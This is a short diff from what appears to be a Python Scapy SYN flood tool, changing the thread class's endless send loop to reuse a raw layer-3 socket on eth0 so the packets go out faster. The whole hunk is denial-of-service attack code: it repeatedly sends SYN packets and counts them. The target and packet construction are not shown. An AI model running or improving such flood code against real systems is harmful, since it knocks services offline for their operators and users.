@@ -29,8 +29,9 @@ class SynFlood(threading.Thread):
     def run(self):
         global total
         syn_packet = self.build_syn_packet()
+        s = conf.L3socket(iface='eth0')
         while True:
-            send(syn_packet,verbose=0)
+            s.send(syn_packet)
             total += 1
 
 
